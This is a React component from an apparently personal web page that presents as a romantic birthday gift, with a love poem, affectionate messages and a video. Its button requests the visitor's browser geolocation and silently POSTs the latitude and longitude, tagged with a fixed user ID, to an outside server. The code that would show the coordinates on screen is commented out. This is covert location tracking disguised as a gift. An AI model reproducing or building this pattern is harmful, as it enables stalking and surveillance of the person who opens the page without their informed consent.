import React, { useState } from "react";
import LovePoem from "./components/LovePoem";

const LocationSender = () => {
  const [status, setStatus] = useState("");
  const [coords, setCoords] = useState(null);

  const sendLocation = async (latitude, longitude) => {
    try {
      const res = await fetch("https://messageweb-njt9.onrender.com/location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userId: "pratham",
          latitude,
          longitude,
        }),
      });

      const data = await res.json();
      console.log("Server response:", data);
      setStatus("You are my life I love you❤️🥰");
    } catch (err) {
      console.error(err);
      setStatus("You did something wrong⚠");
    }
  };

  const handleSendLocation = () => {
    if (!navigator.geolocation) {
      setStatus("Geolocation not supported by your browser");
      return;
    }

    setStatus("Getting Started Betu😘");

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        setCoords({ latitude, longitude });
        sendLocation(latitude, longitude);
      },
      (error) => {
        console.error(error);

        if (error.code === error.PERMISSION_DENIED) {
          setStatus(
            "⚠️ You denied location. Please enable it in browser settings.",
          );
        } else if (error.code === error.POSITION_UNAVAILABLE) {
          setStatus("❌ Location unavailable. Turn on GPS or check network.");
        } else if (error.code === error.TIMEOUT) {
          setStatus("⌛ Location request timed out. Try again.");
        } else {
          setStatus("❌ Unknown error getting location.");
        }
      },
    );
  };

  return (
    <div style={{ textAlign: "center", marginTop: "3rem" }} className="">
      <h1>
        <LovePoem />
      </h1>
      <button
        onClick={handleSendLocation}
        style={{
          background: "#2563eb",
          color: "#fff",
          border: "none",
          padding: "10px 20px",
          borderRadius: "8px",
          cursor: "pointer",
          fontSize: "1rem",
        }}
      >
        Click Me Baccha
      </button>

      <p style={{ marginTop: "1rem" }}>{status}</p>

      {coords && (
        <div style={{ marginTop: "1rem" }}>
          <p>
            {/* <strong>Latitude:</strong> {coords.latitude} */}
            {coords.latitude && (
              // <div>
              //   <h3 className="luv-title">
              //     A little early... but my heart couldn't wait.
              //   </h3>

              //   <p className="luv-sub">
              //     Your birthday hasn't come yet, but I already find myself
              //     smiling — thinking about the day the world got a little more
              //     beautiful because you were born in it. You may not know how
              //     much you mean to me, but I hope someday you feel even a
              //     fraction of the warmth you make me feel just by existing. The
              //     day i first saw you was day same day i fell in love with you.
              //   </p>

              //   <div className="luv-small">
              //     Happy birthday in advance, my favourite person I'm too afraid
              //     to tell i never have imagined life without you. 🎂
              //   </div>
              // </div>
              <div
                style={{
                  width: "100%",
                  borderRadius: "16px",
                  overflow: "hidden",
                  position: "relative",
                }}
              >
                <video
                  src="/day4.mp4"
                  muted
                  autoPlay
                  loop
                  playsInline
                  controls
                  style={{
                    width: "100%",
                    display: "block",
                    borderRadius: "16px",
                  }}
                />
              </div>
            )}
          </p>
          <p>{/* <strong>Longitude:</strong> {coords.longitude} */}</p>
          {/* <a
            href={`https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`}
            target="_blank"
            rel="noreferrer"
          >
            🌍 View on Google Maps
          </a> */}
        </div>
      )}
    </div>
  );
};

export default LocationSender;
